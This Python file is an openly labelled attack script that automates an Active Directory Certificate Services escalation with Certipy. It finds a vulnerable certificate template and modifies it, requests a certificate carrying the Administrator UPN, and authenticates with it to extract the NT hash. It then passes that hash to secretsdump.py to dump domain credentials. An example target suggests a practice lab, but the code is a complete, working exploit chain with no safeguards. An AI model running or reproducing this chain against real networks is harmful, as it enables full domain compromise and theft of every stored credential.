import subprocess
import re
from rich.console import Console
from rich.panel import Panel
from subprocess import Popen, PIPE
import argparse

console = Console()

def parse_arguments():
    parser = argparse.ArgumentParser(description="Certipy-based attack script")
    parser.add_argument("-u", "--user", required=True, help="Username for authentication")
    parser.add_argument("-p", "--password", required=True, help="Password for authentication")
    parser.add_argument("-t", "--target", required=True, help="Target domain (e.g., dc.sendai.vl)")
    parser.add_argument("-d", "--dc-ip", required=True, help="Domain Controller IP address")
    return parser.parse_args()

def run_certipy_find(user, password, target):
    console.print("[+] Enumerating certificate templates...", style="bold cyan")
    command = [
        "certipy", "find",
        "-u", user,
        "-p", password,
        "-target", target,
        "-enabled",
        "-stdout",
        "-vulnerable"
    ]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        result.check_returncode()  # Will raise an exception if the command fails
        console.print("[+] Certipy find completed.", style="green")
        return result.stdout
    except subprocess.CalledProcessError as e:
        console.print(f"[!] Error running Certipy find: {e.stderr}", style="red")
        return None
    except Exception as e:
        console.print(f"[!] Unexpected error during Certipy find: {e}", style="red")
        return None


def parse_certipy_find_output(output):
    console.print("[+] Parsing Certipy find output...", style="bold cyan")
    try:
        vulnerable_to = re.search(r"\[!\] Vulnerabilities\s+(.*)", output, re.S)
        vulnerabilities = vulnerable_to.group(1).strip() if vulnerable_to else "N/A"
        ca_name = re.search(r"CA Name\s+: (.+)", output)
        template_name = re.search(r"Template Name\s+: (.+)", output)

        ca_name = ca_name.group(1).strip() if ca_name else None
        template_name = template_name.group(1).strip() if template_name else None

        if ca_name and template_name:
            message = (
                f"[bold red][*] Vulnerable Template:[/bold red] {template_name}\n"
                f"[bold red][*] CA Name:[/bold red] {ca_name}\n"
                f"[bold red][*] Vulnerabilities:[/bold red] {vulnerabilities}"
            )
            console.print(Panel(message, title="[bold green]Parsed Certipy Output[/bold green]", border_style="green"))
        else:
            console.print("[!] Failed to parse Certipy output.", style="red")

        return ca_name, template_name
    except Exception as e:
        console.print(f"[!] Error parsing Certipy output: {e}", style="red")
        return None, None


def run_certipy_template(user, password, template, dc_ip):
    console.print("[+] Modifying the certificate template...", style="bold cyan")
    command = [
        "certipy", "template",
        "-u", user,
        "-p", password,
        "-template", template,
        "-save-old",
        "-dc-ip", dc_ip
    ]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        result.check_returncode()
        console.print("[+] Certipy template modification completed.", style="green")
        return True
    except subprocess.CalledProcessError as e:
        console.print(f"[!] Error running Certipy template: {e.stderr}", style="red")
        return False
    except Exception as e:
        console.print(f"[!] Unexpected error during Certipy template modification: {e}", style="red")
        return False


def run_certipy_request(user, password, ca, target, template):
    domain = target.split(".")[0]
    if len(domain) < 2:
        console.print(f"[!] Invalid domain format for target: {target}", style="red")
        return None
    
    upn = f"Administrator@{target}" 
    console.print(f"[+] Requesting a certificate with UPN: {upn}", style="bold cyan")

    command = [
        "certipy", "req",
        "-u", user,
        "-p", password,
        "-ca", ca,
        "-target", target,
        "-template", template,
        "-upn", upn,
        "-debug"
    ]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        result.check_returncode()  # Will raise an exception if the command fails
        console.print(f"[+] Certificate request completed.\n{result.stdout}", style="bold red")
        return "administrator.pfx"
    except subprocess.CalledProcessError as e:
        console.print(f"[!] Error running Certipy req: {e.stderr}", style="bold red")
        return None
    except Exception as e:
        console.print(f"[!] Unexpected error during Certipy request: {e}", style="red")
        return None

def run_certipy_auth(pfx_file, domain):
    console.print("[+] Authenticating with the forged certificate...", style="bold cyan")
    command = [
        "certipy", "auth",
        "-pfx", pfx_file,
        "-domain", domain
    ]
    try:
        result = subprocess.run(command, capture_output=True, text=True)
        result.check_returncode()
        console.print(f"[+] Authentication successful.\n{result.stdout}", style="bold red")
        return result.stdout
    except subprocess.CalledProcessError as e:
        console.print(f"[!] Error running Certipy auth: {e.stderr}", style="bold red")
        return None
    except Exception as e:
        console.print(f"[!] Unexpected error during Certipy auth: {e}", style="red")
        return None


def extract_nt_hash(certipy_output):
    console.print("[+] Extracting NT hash from Certipy output...", style="bold cyan")
    match = re.search(r"Got hash for 'administrator@.+': ([a-f0-9]+):([a-f0-9]+)", certipy_output)
    if match:
        full_hash = f"{match.group(1)}:{match.group(2)}"
        console.print(f"[+] Extracted NT Hash: {full_hash}", style="bold green")
        return full_hash
    console.print("[!] NT hash not found in Certipy output.", style="red")
    return None


def run_secretsdump(user, ntlm_hash, target):
    console.print("[+] Running secretsdump.py with NTLM hash...", style="bold cyan")
    
    if not ntlm_hash or ":" not in ntlm_hash:
        console.print("[!] Invalid NTLM hash format. Please check the extracted hash.", style="red")
        return None
    
    command = [
        "secretsdump.py", f"Administrator@{target}", "-hashes", ntlm_hash
    ]
    
    console.print(f"[+] Running command: {' '.join(command)}", style="bold red")
    
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    for stdout_line in process.stdout:
        console.print(stdout_line.strip(), style="bold cyan")
    
    for stderr_line in process.stderr:
        console.print(stderr_line.strip(), style="red")
    
    return_code = process.wait()
    
    if return_code != 0:
        console.print(f"[!] Error running secretsdump.py: {stderr_line}", style="red")
        return None
    
    console.print(f"[+] secretsdump.py completed successfully.", style="bold green")
    return True


def main():
    args = parse_arguments()

    certipy_find_output = run_certipy_find(args.user, args.password, args.target)
    if not certipy_find_output:
        return

    ca_name, template_name = parse_certipy_find_output(certipy_find_output)
    if not ca_name or not template_name:
        return

    if not run_certipy_template(args.user, args.password, template_name, args.dc_ip):
        return

    pfx_file = run_certipy_request(args.user, args.password, ca_name, args.target, template_name)
    if not pfx_file:
        return

    certipy_auth_output = run_certipy_auth(pfx_file, args.target)
    if not certipy_auth_output:
        return

    nt_hash = extract_nt_hash(certipy_auth_output)
    if not nt_hash:
        return

    run_secretsdump(args.user, nt_hash, args.target)


if __name__ == "__main__":
    main()
